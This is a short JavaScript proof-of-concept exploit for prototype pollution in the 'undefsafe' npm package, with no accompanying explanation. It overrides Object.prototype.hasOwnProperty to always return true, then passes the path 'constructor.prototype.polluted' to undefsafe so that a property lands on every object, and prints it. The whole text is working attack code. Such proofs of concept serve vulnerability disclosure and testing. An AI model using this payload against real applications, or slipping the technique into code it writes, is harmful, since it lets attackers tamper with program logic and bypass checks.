Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = 'constructor.prototype.polluted';
a({}, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');